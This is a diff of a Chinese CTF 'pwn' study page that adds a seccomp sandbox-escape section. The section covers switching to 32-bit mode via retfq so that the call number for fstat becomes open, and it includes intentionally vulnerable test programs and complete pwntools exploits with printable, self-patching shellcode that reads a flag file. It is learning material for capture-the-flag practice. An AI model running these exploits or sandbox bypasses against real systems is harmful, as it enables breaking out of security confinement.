@@ -3,23 +3,6 @@ title: shellcode
 date: 2024-08-30 22:11:42
 ---
 
-# 各种读取函数的截断
-| 函数                   | 截断字符                           | 截断属性                                                   | 截断字符是否保留 | 截断后加 |
-| ---------------------- | ---------------------------------- | ---------------------------------------------------------- | ---------------- | -------- |
-| `read(0,a,0x100)`      | EOF                                | 无                                                         | 无               | 无       |
-| `*a=getchar()`         | EOF                                | 无                                                         | 无               | 无       |
-| `scanf("%c",a)`        | EOF                                | 无                                                         | 无               | 无       |
-| `scanf("%s",a)`        | EOF 0x09 0x0a 0x0b 0x0c 0x0d 0x20  | 截断字符前有有效内容则截断，无有效内容则跳过截断字符读后面 | 不保留           | 0x00     |
-| `sscanf(a,"%s",b)`     | 0x00 0x09 0x0a 0x0b 0x0c 0x0d 0x20 | 截断字符前有有效内容则截断，无有效内容则跳过截断字符读后面 | 不保留           | 0x00     |
-| `gets(a)`              | EOF 0x0a                           | 截断字符前无论有无有效内容均截断                           | 不保留           | 0x00     |
-| `fgets(a,0x100,stdin)` | EOF 0x0a                           | 截断字符前无论有无有效内容均截断                           | 保留             | 0x00     |
-| `sscanf(a,"%[^;];",b)` | 0x00 0x3b                          | 无                                                         | 不保留           | 0x00     |
-| `sprintf(b,"%s",a)`    | 0x00                               | 无                                                         | 保留             | 无       |
-| `strcpy(b,a)`          | 0x00                               | 无                                                         | 保留             | 无       |
-| `strcat(b,a)`          | 0x00                               | 无                                                         | 保留             | 无       |
-| `strncat(b,a,0x10)`    | 0x00                               | 无                                                         | 保留             | 无       |
-| `strncat(b,a,0x10)`    | 达到拷贝长度                       | 无                                                         | 保留             | 0x00 |
-
 # shellcode
 关于系统调用号：[syscall](/pwn/syscall)
 
@@ -152,11 +135,495 @@ pop rax
 syscall
 ```
 
+#### mmap fstat read write
+> 有时候程序会禁用open,openat,openat2这三个打开文件的方法，但是没有禁用fstat系统调用，该系统调用号在32位的环境下为open系统调用，于是我们就可以通过retfq指令将程序转到32位环境下运行，利用32位的open系统调用打开flag文件
+
+注意，如果是以下含有arch检测的沙箱无法通过这种方式绕过，一般通过seccomp_rule_add生成的就是这种
+```
+ line  CODE  JT   JF      K
+=================================
+ 0000: 0x20 0x00 0x00 0x00000004  A = arch
+ 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
+ 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
+ 0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011
+ 0005: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0010
+ 0006: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0010
+ 0007: 0x15 0x02 0x00 0x00000005  if (A == fstat) goto 0010
+ 0008: 0x15 0x01 0x00 0x00000009  if (A == mmap) goto 0010
+ 0009: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0011
+ 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0011: 0x06 0x00 0x00 0x00000000  return KILL
+```
+
+下面这种没有对arch的检测，可以绕过
+```
+ line  CODE  JT   JF      K
+=================================
+ 0000: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0001: 0x15 0x05 0x00 0x00000005  if (A == fstat) goto 0007
+ 0002: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0007
+ 0003: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0007
+ 0004: 0x15 0x02 0x00 0x00000009  if (A == mmap) goto 0007
+ 0005: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0007
+ 0006: 0x06 0x00 0x00 0x00000000  return KILL
+ 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+```
+
+下面是用于测试的程序
+```c
+// gcc ./pwn.c -o pwn
+
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/syscall.h>
+#include <sys/types.h>
+#include <sys/mman.h>
+#include <seccomp.h>
+#include <linux/seccomp.h>
+#include <linux/filter.h>
+#include <linux/bpf.h>
+#include <sys/prctl.h>
+
+void sandbox()
+{
+    // 这种加seccomp的方式无法通过切换为32位进行绕过，因为还会检测架构
+    // scmp_filter_ctx ctx;
+    // ctx = seccomp_init(SCMP_ACT_KILL);
+    // seccomp_arch_add(ctx,SCMP_ARCH_X86); // 加了这一行也没用，只会允许32位的fstat系统调用，而不是系统调用号为5的open
+    // seccomp_rule_add(ctx,SCMP_ACT_ALLOW,SCMP_SYS(fstat),0);
+    // seccomp_rule_add(ctx,SCMP_ACT_ALLOW,SCMP_SYS(read),0);
+    // seccomp_rule_add(ctx,SCMP_ACT_ALLOW,SCMP_SYS(write),0);
+    // seccomp_rule_add(ctx,SCMP_ACT_ALLOW,SCMP_SYS(mmap),0);
+    // seccomp_rule_add(ctx,SCMP_ACT_ALLOW,SCMP_SYS(exit_group),0);
+    // seccomp_load(ctx);
+
+    // 如果采用手写BPF过滤规则，并利用prctl设置seccomp的方式，就有可能漏掉对arch的检测，因此可以绕过
+    struct sock_filter filter[]={
+        BPF_STMT(BPF_LD|BPF_W|BPF_ABS, 0),
+        BPF_JUMP(BPF_JMP|BPF_JEQ,SCMP_SYS(fstat), 5, 0),
+        BPF_JUMP(BPF_JMP|BPF_JEQ,SCMP_SYS(read), 4, 0),
+        BPF_JUMP(BPF_JMP|BPF_JEQ,SCMP_SYS(write), 3, 0),
+        BPF_JUMP(BPF_JMP|BPF_JEQ,SCMP_SYS(mmap), 2, 0),
+        BPF_JUMP(BPF_JMP|BPF_JEQ,SCMP_SYS(exit_group), 1, 0),
+        BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL),
+        BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW)
+    };
+
+    struct sock_fprog prog={
+        .len=sizeof(filter)/sizeof(filter[0]),
+        .filter=filter,
+    };
+
+    prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0);
+    prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&prog);
+}
+
+int main()
+{
+    sandbox();
+    void *buf = (void *) syscall(SYS_mmap,0x500000,0x1000,7,MAP_SHARED|MAP_ANONYMOUS,-1,0);
+    syscall(SYS_write,1,"shellcode: ",11);
+    size_t len = syscall(SYS_read,0,buf,0x1000);
+    for(int i=0; i<len-1 ; i++)
+    {
+        if(buf[i]<=0x1f || buf[i]>= 0x7f)
+            syscall(SYS_exit_group,-1);
+    }
+    ((void (*)())buf)();
+    syscall(SYS_exit_group,0);
+}
+```
+
+下面的exp可以打通上面的程序
+
+```python
+from pwn import *
+context.log_level = 'debug'
+
+p = process('./pwn')
+
+append = '''
+/* 机器码: 52 5a */
+push rdx
+pop rdx
+'''
+
+shellcode_x86 = '''
+/*fp = open("flag")*/
+mov esp,0x40404140
+
+/* s = "flag" */
+push 0x67616c66
+
+/* ebx = &s */
+push esp
+pop ebx
+
+/* ecx = 0 */
+xor ecx,ecx
+
+mov eax,5
+int 0x80
+
+mov ecx,eax
+'''
+
+shellcode_flag = '''
+/* retfq:  mode_32 -> mode_64*/
+push 0x33
+push 0x40404089
+retfq
+
+/*read(fp,buf,0x70)*/
+mov rdi,rcx
+mov rsi,rsp
+mov rdx,0x70
+xor rax,rax
+syscall
+
+/*write(1,buf,0x70)*/
+mov rdi,1
+mov rax,1
+syscall
+'''
+
+# 0x40404040 为32位shellcode地址
+shellcode_mmap = '''
+push rdx /* 将这段shellcode的起始地址保存到rbx中,rdx根据call的寄存器进行修改 */
+pop rbx
+
+/*mmap(0x40404040,0x7e,7,33,-1,0)*/
+push 0x40404040 /*set rdi*/
+pop rdi
+
+push 0x7e /*set rsi*/
+pop rsi
+
+push 0x40 /*set rdx*/
+pop rax
+xor al,0x47
+push rax
+pop rdx
+
+push 0x40 /*set r10*/
+pop rax
+xor al,0x61
+push rax
+pop r10
+
+push 0x40 /*set r8*/
+pop rax
+xor al,0x40
+push rax
+pop r8
+
+push rax /*set r9*/
+pop r9
+
+/*syscall*/
+/* syscall 的机器码是 0f 05, 都是不可打印字符. */
+/* 用异或运算来解决这个问题: 0x0f = 0x5d^0x52, 0x05 = 0x5f^0x5a. */
+/* 其中 0x52,0x5a 由 append 提供. */
+push rbx
+pop rax
+push 0x5d
+pop rcx
+xor byte ptr[rax+0x3b],cl
+push 0x5f
+pop rcx
+xor byte ptr[rax+0x3c],cl
+
+push 0x22 /*set rcx*/
+pop rcx
+
+push 0x40/*set rax*/
+pop rax
+xor al,0x49
+'''
+
+shellcode_read = '''
+/*read(0,0x40404040,0x70)*/
+
+push 0x40404040 /*set rsi*/
+pop rsi
+
+push 0x40 /*set rdi*/
+pop rax
+xor al,0x40
+push rax
+pop rdi
+
+xor al,0x40 /*set rdx*/
+push 0x70
+pop rdx
+
+/*syscall*/
+push rbx
+pop rax
+push 0x5d
+pop rcx
+xor byte ptr[rax+0x61],cl
+push 0x5f
+pop rcx
+xor byte ptr[rax+0x62],cl
+
+push rdx /*set rax*/
+pop rax
+xor al,0x70
+'''
+
+shellcode_retfq = '''
+/*mode_64 -> mode_32*/
+push rbx
+pop rax
+
+xor al,0x40
+
+push 0x72
+pop rcx
+xor byte ptr[rax+0x4a],cl
+push 0x68
+pop rcx
+xor byte ptr[rax+0x4a],cl
+push 0x47
+pop rcx
+sub byte ptr[rax+0x4b],cl
+push 0x48
+pop rcx
+sub byte ptr[rax+0x4b],cl
+push rdi
+push rdi
+push 0x23
+push 0x40404040
+pop rax
+push rax
+'''
+
+shellcode_x86 = asm(shellcode_x86 ,arch = 'i386')
+shellcode_flag = asm(shellcode_flag, arch = 'amd64', os = 'linux')
+shellcode = ''
+
+# mmap
+shellcode += shellcode_mmap
+shellcode += append
+
+# read shellcode
+shellcode += shellcode_read
+shellcode += append
+
+# mode_64 -> mode_32
+shellcode += shellcode_retfq
+shellcode += append
+
+shellcode = asm(shellcode,arch = 'amd64',os = 'linux')
+
+p.recvuntil("shellcode: ")
+
+p.sendline(shellcode)
+sleep(3)
+
+p.sendline(shellcode_x86 + 0x29*b'\x90' + shellcode_flag)
+p.interactive()
+```
+
+#### fstat read write
+> 比上一题少了一个mmap，这种一般会提前用mmap申请一块rwx的内存，并且内存地址是小于32位地址长度限制的
+
+测试程序
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <time.h>
+#include <sys/syscall.h>
+#include <sys/types.h>
+#include <sys/mman.h>
+#include <seccomp.h>
+#include <linux/seccomp.h>
+#include <linux/filter.h>
+#include <linux/bpf.h>
+#include <sys/prctl.h>
+
+void sandbox()
+{
+    struct sock_filter filter[]={
+        BPF_STMT(BPF_LD|BPF_W|BPF_ABS, 0),
+        BPF_JUMP(BPF_JMP|BPF_JEQ,SCMP_SYS(fstat), 4, 0),
+        BPF_JUMP(BPF_JMP|BPF_JEQ,SCMP_SYS(read), 3, 0),
+        BPF_JUMP(BPF_JMP|BPF_JEQ,SCMP_SYS(write), 2, 0),
+        BPF_JUMP(BPF_JMP|BPF_JEQ,SCMP_SYS(exit_group), 1, 0),
+        BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL),
+        BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW)
+    };
+
+    struct sock_fprog prog={
+        .len=sizeof(filter)/sizeof(filter[0]),
+        .filter=filter,
+    };
+
+    prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0);
+    prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&prog);
+}
+
+int main()
+{
+    char buf[0x1000];
+    srand(time(0));
+    int res = rand() % 0x7fffffff;
+    char *dest = (char *) syscall(SYS_mmap,res,0x1000,7,MAP_SHARED|MAP_ANONYMOUS,-1,0);
+    sandbox();
+    syscall(SYS_write,1,"shellcode: ",11);
+    size_t len = syscall(SYS_read,0,buf,0x1000);
+    for(int i = 0 ; i<len-1 ; i++)
+    {
+        if(buf[i]<=0x1f || buf[i]>= 0x7f)
+            syscall(SYS_exit_group,-1);
+    }
+    strcpy(dest,buf);
+    ((void (*)())dest)();
+    syscall(SYS_exit_group,0);
+}
+```
+mmap申请的地址是随机的，但是肯定小于32位地址长度限制
+并且会检测输入是否为可打印字符
+
+```python
+from pwn import *
+import ctypes
+
+context.log_level = "debug"
+
+clibc = ctypes.CDLL("/lib/libc.so.6")
+addr = 0
+dest = 0
+
+# 由于shellcode中用到了addr，所以需要addr为可打印字符，因此需要爆破一下
+while True:
+    p = process("./pwn3")
+    clibc.srand(clibc.time(0))
+    dest = clibc.rand() % 0x7FFFFFFF
+    dest = dest & 0xFFFFF000 # mmap内存对齐
+    addr = dest + 0x550
+    if not (isprint(p32(addr)[0]) and isprint(p32(addr)[1]) and isprint(p32(addr)[2]) and isprint(p32(addr)[3])):
+        p.close()
+        continue
+    break
+
+shellcode_x86 = f'''
+mov esp,{addr+0x100}
+push 0x67616c66
+push esp
+pop ebx
+xor ecx,ecx
+mov eax,5
+int 0x80
+mov ecx,eax
+'''
+
+shellcode_flag = f'''
+push 0x33
+push {addr+0x49}
+retfq
+mov rdi,rcx
+mov rsi,rsp
+mov rdx,0x70
+xor rax,rax
+syscall
+mov rdi,1
+mov rax,1
+syscall
+'''
+
+shellcode_read = f'''
+push rdx /* 同样的,将本段shellcode的起始位置保存到rbx中 */
+pop rbx
+
+/*read(0,addr,0x70)*/
+
+push {addr} /*set rsi*/
+pop rsi
+
+push 0x40 /*set rdi*/
+pop rax
+xor al,0x40
+push rax
+pop rdi
+
+xor al,0x40 /*set rdx*/
+push 0x70
+pop rdx
+
+/*syscall*/
+push rbx
+pop rax
+push 0x5d
+pop rcx
+xor byte ptr[rax+0x26],cl
+push 0x5f
+pop rcx
+xor byte ptr[rax+0x27],cl
+
+push rdx /*set rax*/
+pop rax
+xor al,0x70
+'''
+
+append = '''
+/* 52 5a */
+push rdx
+pop rdx
+'''
+
+shellcode_retfq = f'''
+/*mode_64 -> mode_32*/
+
+push rbx
+pop rax
+
+push 0x72
+pop rcx
+xor byte ptr[rax+0x4d],cl
+push 0x68
+pop rcx
+xor byte ptr[rax+0x4d],cl
+push 0x47
+pop rcx
+sub byte ptr[rax+0x4e],cl
+push 0x48
+pop rcx
+sub byte ptr[rax+0x4e],cl
+push rdi
+push rdi
+push 0x23
+push {addr}
+pop rax
+push rax
+'''
+
+shellcode_x86 = asm(shellcode_x86, arch='i386')
+shellcode_flag = asm(shellcode_flag, arch = 'amd64', os = 'linux')
+
+shellcode = shellcode_read + append
+shellcode += shellcode_retfq + append
+shellcode = asm(shellcode,arch = 'amd64',os = 'linux')
+
+p.recvuntil(b'shellcode: ')
+p.send(shellcode)
+sleep(3)
+p.sendline(shellcode_x86 + 0x29*b'\x90' + shellcode_flag)
+
+p.interactive()
+```
+
 ### fork ptrace
 > 有时我们会遇到返回TRACE的沙箱，并且题目没有禁用fork和ptrace，这就给了我们绕过沙箱的手段
 下面是一个示例程序，我们可以看到，题目对execve,execveat,open,openat,openat2都加了限制，但返回的不是KILL，而是TRACE;
 于是我们就可以通过fork加ptrace的方式绕过沙箱，拿到shell
 ```c
+// gcc ./pwn.c -o pwn -lseccomp 
+
 #include <stdio.h>
 #include <unistd.h>
 #include <sys/syscall.h>
@@ -355,4 +822,6 @@ b"PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K
 [CTF中常见的C语言输入函数截断属性总结](https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/16/input/)
 [Ubuntu 发行版本与内核对应关系](https://blog.csdn.net/FLM19990626/article/details/129154795)
 [shellcode进阶之手写shellcode](https://xz.aliyun.com/t/13813)
+[栈沙箱学习之orw](https://xz.aliyun.com/t/12787)
+[shellcode 的艺术](https://xz.aliyun.com/t/6645)
 [各种seccomp绕过](https://blog.csdn.net/qq_54218833/article/details/134205383)
